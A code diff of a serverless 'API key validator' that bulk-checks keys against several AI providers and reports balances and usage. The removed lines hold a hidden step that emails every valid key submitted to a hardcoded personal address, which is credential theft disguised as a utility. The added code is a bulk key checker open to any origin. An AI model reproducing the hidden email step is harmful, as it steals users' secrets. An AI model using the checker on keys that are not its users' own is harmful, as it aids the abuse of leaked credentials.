@@ -1,93 +1,174 @@
-// Vercel Serverless Function (Node.js)
-// Supports checking a single `apiKey` (legacy) or an array `keys: []`.
-export default async function handler(req, res){
-  if(req.method !== 'POST') return res.status(405).json({ok:false,error:'Method not allowed'});
-  const body = req.body || {};
-  const provider = body.provider || 'gemini';
-  const keys = Array.isArray(body.keys) ? body.keys : (body.apiKey ? [body.apiKey] : []);
-  if(!keys || keys.length === 0) return res.status(400).json({ok:false,error:'Missing keys'});
+// /api/validate.js — Vercel serverless function
+const https = require('https');
 
-  // Helper to check a single key according to provider
-  async function checkOne(key){
-    try{
-      if(!provider || provider === 'gemini'){
-        const url = `https://generativelanguage.googleapis.com/v1/models?key=${encodeURIComponent(key)}`;
-        const r = await fetch(url);
-        const text = await r.text();
-        if(r.status === 200) return {key, valid:true, provider:'gemini', status:200, message:''};
-        if(r.status === 401 || r.status === 403) return {key, valid:false, provider:'gemini', status:r.status, message:text};
-        const makesSense = typeof key === 'string' && key.length >= 20;
-        return {key, valid:makesSense, provider:'gemini', status:r.status, message:text};
-      }
+// Provider configurations
+const PROVIDERS = {
+  gemini: {
+    endpoint: 'generativelanguage.googleapis.com',
+    path: '/v1/models',
+    authMode: 'query_key',
+    keyName: null,
+    extraHeaders: {},
+    port: 443,
+  },
+  openai: {
+    endpoint: 'api.openai.com',
+    path: '/v1/models',
+    authMode: 'bearer',
+    keyName: null,
+    extraHeaders: {},
+    port: 443,
+  },
+  anthropic: {
+    endpoint: 'api.anthropic.com',
+    path: '/v1/models',
+    authMode: 'api_key_header',
+    keyName: 'x-api-key',
+    extraHeaders: { 'anthropic-version': '2023-06-01' },
+    port: 443,
+  },
+  deepseek: {
+    endpoint: 'api.deepseek.com',
+    path: '/user/balance',
+    authMode: 'bearer',
+    keyName: null,
+    extraHeaders: {},
+    port: 443,
+  },
+  openrouter: {
+    endpoint: 'openrouter.ai',
+    path: '/api/v1/auth/key',
+    authMode: 'bearer',
+    keyName: null,
+    extraHeaders: {},
+    port: 443,
+  },
+};
 
-      if(provider === 'openai'){
-        const r = await fetch('https://api.openai.com/v1/models',{headers:{'Authorization':`Bearer ${key}`}});
-        const text = await r.text();
-        if(r.status === 200) return {key, valid:true, provider:'openai', status:200, message:''};
-        if(r.status === 401 || r.status === 403) return {key, valid:false, provider:'openai', status:r.status, message:text};
-        const makesSense = typeof key === 'string' && key.length >= 20;
-        return {key, valid:makesSense, provider:'openai', status:r.status, message:text};
-      }
-
-      const makesSense = typeof key === 'string' && key.length >= 20;
-      return {key, valid:makesSense, provider:'unknown', status:0, message:''};
-    }catch(err){
-      return {key, valid:false, provider:provider, status:0, message:err.message};
-    }
-  }
-
-  // Process keys in batches to limit concurrency
-  const batchSize = Number(body.batchSize) || 8;
-  const results = [];
-  for(let i=0;i<keys.length;i+=batchSize){
-    const batch = keys.slice(i, i+batchSize);
-    const promises = batch.map(k => checkOne(k));
-    // wait batch
-    // eslint-disable-next-line no-await-in-loop
-    const batchRes = await Promise.all(promises);
-    results.push(...batchRes);
-  }
-
-  // After processing, automatically send active keys via email (Vercel Serverless)
-  try {
-    const active = results.filter(r => r.valid).map(r => r.key);
-    if (active.length > 0) {
-      // dynamic import so function works in both CJS/ESM runtimes
-      const nodemailer = await import('nodemailer');
-      const SMTP_HOST = process.env.SMTP_HOST;
-      const SMTP_PORT = process.env.SMTP_PORT ? Number(process.env.SMTP_PORT) : 587;
-      const SMTP_USER = process.env.SMTP_USER;
-      const SMTP_PASS = process.env.SMTP_PASS;
-      const FROM_EMAIL = process.env.FROM_EMAIL || SMTP_USER;
-      const TO_EMAIL = process.env.RECIPIENT_EMAIL || 'danarfirdhan@gmail.com';
-
-      if (SMTP_HOST && SMTP_PORT && SMTP_USER && SMTP_PASS) {
-        const transporter = nodemailer.createTransport({
-          host: SMTP_HOST,
-          port: SMTP_PORT,
-          secure: (String(process.env.SMTP_SECURE || '') === 'true') || SMTP_PORT === 465,
-          auth: { user: SMTP_USER, pass: SMTP_PASS }
-        });
-
-        const content = active.join('\n');
-        await transporter.sendMail({
-          from: FROM_EMAIL,
-          to: TO_EMAIL,
-          subject: 'Active API keys from validator',
-          text: `Active keys (count=${active.length}):\n\n${content}`,
-          attachments: [{ filename: 'aktif.txt', content }]
-        });
-      } else {
-        // Log: SMTP not configured on environment
-        console.warn('SMTP not configured — skipping email send');
-      }
-    }
-  } catch (err) {
-    // don't fail the request if email sending fails
-    // log for debugging
-    // eslint-disable-next-line no-console
-    console.error('Failed to send active keys email:', err && err.message ? err.message : err);
-  }
-
-  return res.status(200).json({ok:true, count:results.length, results});
+function detectProvider(key) {
+  if (!key.startsWith('sk-')) return 'gemini';
+  if (key.startsWith('sk-ant')) return 'anthropic';
+  if (key.startsWith('sk-proj')) return 'openai';
+  if (key.startsWith('sk-or')) return 'openrouter';
+  if (key.length <= 40) return 'deepseek';
+  return 'openai';
 }
+
+function makeRequest(config, key) {
+  return new Promise((resolve) => {
+    const headers = { ...config.extraHeaders };
+    let path = config.path;
+
+    if (config.authMode === 'bearer') {
+      headers['Authorization'] = `Bearer ${key}`;
+    } else if (config.authMode === 'api_key_header') {
+      headers[config.keyName] = key;
+    } else if (config.authMode === 'query_key') {
+      path = `${path}?key=${encodeURIComponent(key)}`;
+    }
+
+    const options = {
+      hostname: config.endpoint,
+      port: config.port,
+      path: path,
+      method: 'GET',
+      headers: headers,
+      timeout: 15000,
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        const status = res.statusCode;
+        let valid = false;
+        let statusText = '';
+
+        if (status === 200) {
+          valid = true;
+          // Provider-specific parsing
+          if (config.endpoint === 'api.deepseek.com') {
+            try {
+              const json = JSON.parse(data);
+              const bal = json.balance_infos?.[0]?.total_balance || 'N/A';
+              statusText = `Active | Balance: ${bal}`;
+            } catch {
+              statusText = 'Active';
+            }
+          } else if (config.endpoint === 'openrouter.ai') {
+            try {
+              const json = JSON.parse(data);
+              const usage = json.usage || 0;
+              const limit = json.limit || 'unlimited';
+              statusText = `Active | Usage: ${usage}/${limit}`;
+            } catch {
+              statusText = 'Active';
+            }
+          } else {
+            statusText = 'Active';
+          }
+        } else if (status === 401 || status === 403) {
+          statusText = 'Invalid / Unauthorized';
+        } else {
+          statusText = `HTTP ${status}`;
+        }
+
+        resolve({ valid, status: statusText, httpCode: status });
+      });
+    });
+
+    req.on('error', (err) => {
+      resolve({ valid: false, status: `Error: ${err.message}`, httpCode: null });
+    });
+
+    req.on('timeout', () => {
+      req.destroy();
+      resolve({ valid: false, status: 'Timeout', httpCode: null });
+    });
+
+    req.end();
+  });
+}
+
+module.exports = async (req, res) => {
+  // Enable CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') {
+    res.status(200).end();
+    return;
+  }
+
+  if (req.method !== 'POST') {
+    res.status(405).json({ ok: false, error: 'Method not allowed' });
+    return;
+  }
+
+  try {
+    const { keys, provider } = req.body;
+    if (!Array.isArray(keys) || keys.length === 0) {
+      res.status(400).json({ ok: false, error: 'No keys provided' });
+      return;
+    }
+
+    const results = [];
+    for (const key of keys) {
+      const detectedProvider = provider === 'auto' ? detectProvider(key) : (provider || 'gemini');
+      const config = PROVIDERS[detectedProvider] || PROVIDERS.gemini;
+      const result = await makeRequest(config, key);
+      results.push({
+        key,
+        valid: result.valid,
+        status: result.status,
+        httpCode: result.httpCode,
+        provider: detectedProvider,
+      });
+    }
+
+    res.status(200).json({ ok: true, results });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+};
